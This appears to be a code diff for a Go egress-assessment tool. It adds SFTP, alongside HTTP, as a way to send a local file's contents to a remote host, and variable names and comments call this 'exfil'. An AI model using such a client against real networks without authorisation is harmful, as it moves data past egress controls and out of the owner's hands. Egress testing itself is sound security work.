@@ -13,14 +13,21 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"flag"
+	"fmt"
+	"path/filepath"
+	"strings"
 	//"encoding/json"
 	"ego-assess/data"
+	"github.com/pkg/sftp"
+	"golang.org/x/crypto/ssh"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"time"
 )
 
 type Sender interface {
@@ -31,10 +38,111 @@ type Client struct {
 	Target   string
 	Port     string
 	Protocol string
+
+	Username string
+	Password string
 	Data     *bytes.Buffer
 }
 
-//Interface function - sets up the necessary things to transmit HTTP data
+//ripped this from somewhere: checks known_hosts for current user to use with SSH config. May be unneccessary
+
+func checkHostKey(host, port string) (ssh.PublicKey, error) {
+	// $HOME/.ssh/known_hosts
+	homedir, _ := os.UserHomeDir()
+	file, err := os.Open(filepath.Join(homedir, ".ssh", "known_hosts"))
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var hostport string
+	if port == "22" {
+		// standard port assumes 22
+		// 192.168.10.53 ssh-rsa AAAAB3Nza...vguvx+81N1xaw==
+		hostport = host
+	} else {
+		// non-standard port(s)
+		// [ssh.example.com]:1999,[93.184.216.34]:1999 ssh-rsa AAAAB3Nza...vguvx+81N1xaw==
+		hostport = "[" + host + "]:" + port
+	}
+
+	scanner := bufio.NewScanner(file)
+	var hostKey ssh.PublicKey
+	for scanner.Scan() {
+		fields := strings.Split(scanner.Text(), " ")
+		if len(fields) != 3 {
+			continue
+		}
+		if strings.Contains(fields[0], hostport) {
+			var err error
+			hostKey, _, _, _, err = ssh.ParseAuthorizedKey(scanner.Bytes())
+			if err != nil {
+				return nil, fmt.Errorf("Error parsing %q: %v", fields[2], err)
+			}
+			break // scanning line by line, first occurrence will be returned
+		}
+	}
+	if hostKey == nil {
+		return nil, fmt.Errorf("No hostkey for %s", host+":"+port)
+	}
+	return hostKey, nil
+}
+
+//workign SFTP client: connects to server and writes remote file
+func (client Client) transmitSFTP() {
+	hostKey, err := checkHostKey(client.Target, client.Port)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	config := &ssh.ClientConfig{
+		User: client.Username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(client.Password),
+		},
+		HostKeyCallback: ssh.FixedHostKey(hostKey), //could make this IngoreInsecureHostKye?
+	}
+	conn, err := ssh.Dial("tcp", client.Target+":"+client.Port, config)
+	if err != nil {
+		log.Fatal("Failed to dial: ", err)
+	}
+	defer conn.Close()
+
+	// open an SFTP session over an existing sshz connection.
+	sftpclient, err := sftp.NewClient(conn)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer sftpclient.Close()
+
+	// leave your mark ---> FACTOR THIS INTO SEPARATE FILE?
+	//file naming stuff- want it tagged by time
+	datetime := strings.ReplaceAll(time.Now().String(), " ", "")
+	datetime = strings.ReplaceAll(datetime, ":", "-")
+	datetime = datetime[:18]
+
+	filename := datetime + "-remote-data.txt"
+
+	f, err := sftpclient.Create(filename)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer f.Close()
+
+	// create new buffer to write exfil --> possibly break into util function?
+	buffer := bufio.NewWriter(f)
+
+	_, err = buffer.Write(client.Data.Bytes())
+	if err != nil {
+		log.Fatal(err)
+	}
+	if err := buffer.Flush(); err != nil {
+		log.Fatal(err)
+	}
+
+}
+
+//sets up the necessary things to transmit HTTP data
 func (client Client) transmitHTTP() {
 	url := "http://" + client.Target + ":" + client.Port + "/"
 
@@ -46,7 +154,7 @@ func (client Client) transmitHTTP() {
 		log.Fatalf("An Error Occured %v", err)
 	}
 	defer resp.Body.Close()
-	//Read the response body --> not strictly necessary, would prob suffice to 200
+	//Read the response body --> not strictly necessary, would prob suffice to check for 200
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		log.Fatalln(err)
@@ -55,11 +163,13 @@ func (client Client) transmitHTTP() {
 	log.Printf(sb)
 }
 
-//Interface function - sets up the necessary things to transmit HTTP data
+//Interface function - switches between client types
 func (client Client) transmit() {
 	switch client.Protocol {
 	case "HTTP":
 		client.transmitHTTP()
+	case "SFTP":
+		client.transmitSFTP()
 	default:
 		log.Fatal("[x] please choose a supported client protocol")
 	}
@@ -102,7 +212,7 @@ func main() {
 	fileBuffer := new(bytes.Buffer)
 	fileBuffer.ReadFrom(file)
 	contents := bytes.NewBuffer(fileBuffer.Bytes())
-	client = Client{remoteHost, remotePort, exfilProtocol, contents}
+	client = Client{remoteHost, remotePort, exfilProtocol, username, password, contents}
 	client.transmit()
 
 }
